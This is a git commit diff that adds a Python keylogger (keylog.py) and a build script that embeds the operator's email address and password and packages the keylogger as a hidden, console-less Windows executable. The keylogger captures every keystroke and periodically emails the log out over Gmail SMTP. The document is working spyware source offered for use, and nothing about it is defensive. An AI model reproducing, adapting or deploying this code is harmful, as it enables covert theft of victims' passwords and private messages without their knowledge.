f91fa3b010896b452c673c701102ec2862d4c455
Raghuram Subramani <raghus2247@gmail.com>
2021-11-01 07:37:27 +0530

    Finished everything (Hopefully.)

---
+++ compile_for_windows.py
@@ -0,0 +1,44 @@
+import os
+import sys
+import shutil
+
+def replaceFileContent(filename, old_string, new_string):
+    with open(filename) as f:
+        s = f.read()
+        if old_string not in s:
+            return
+
+    with open(filename, 'w') as f:
+        s = s.replace(old_string, new_string)
+        f.write(s)
+
+print('This script is to be run on windows ONLY.\n')
+
+yourmail = input('Enter your email ID > ')
+yourpass = input('Enter your email Password > ')
+print('You can use this website to convert hours / minutes to seconds: https://www.inchcalculator.com/convert/time/')
+thetime = input('How many seconds do you want to wait till the next mail is sent? > ')
+
+listing = os.listdir()
+
+if 'keylog.py' in listing:
+	pass
+else:
+	print("The file 'keylog.py' is not present. Exitting now....")
+	sys.exit(1)
+
+os.mkdir('compiledir')
+os.system('copy keylog.py compiledir/keylog.py')
+os.chdir('compiledir')
+
+
+replaceFileContent('keylog.py', 'YOURMAILHERE', yourmail)
+replaceFileContent('keylog.py', 'YOURPASSHERE', yourpass)
+
+os.system('pyinstaller --onefile --noconsole keylog.py')
+
+os.system('cd ..; cp compiledir/dist/keylog .')
+os.chdir('../')
+shutil.rmtree('compiledir')
+
+print('\nCompiled. Executable is present in current dir.')
---
+++ keylog.py
@@ -0,0 +1,50 @@
+import pynput.keyboard
+import threading
+import requests
+import smtplib
+
+class KeyLogger:
+	def __init__(self, time_interval, email, password):
+		self.log = ''
+		self.interval = time_interval
+		self.mail = email
+		self.passwd = password
+
+	def append_string(self, string):
+		self.log = self.log + string
+
+	def prc_key_press(self, key):
+		try:
+			self.append_string(str(key.char))
+		except AttributeError:
+			if str(key) == 'Key.enter':
+				self.log = self.log + "\n"
+			elif str(key) == 'Key.space':
+				self.log = self.log + " "
+			else:
+				self.log = self.log + " " + str(key) + " "
+
+	def sendmail(self,email, password, message):
+	    server = smtplib.SMTP("smtp.gmail.com", 587)
+	    server.starttls()
+	    server.login(email, password)
+	    server.sendmail(email, email, message)
+	    server.quit()
+
+	def report(self):
+		if len(self.log) == 0:
+			pass
+		else:
+			self.sendmail(self.mail, self.passwd, f"\n\n {self.log}")
+		self.log = ""
+		timer = threading.Timer(self.interval, self.report)
+		timer.start()
+
+	def start(self):
+		keyboard_listener = pynput.keyboard.Listener(on_press=self.prc_key_press)
+		with keyboard_listener:
+			self.report()
+			keyboard_listener.join()
+
+keyinst = KeyLogger(10, 'YOURMAILHERE', 'YOURPASSHERE')
+keyinst.start()
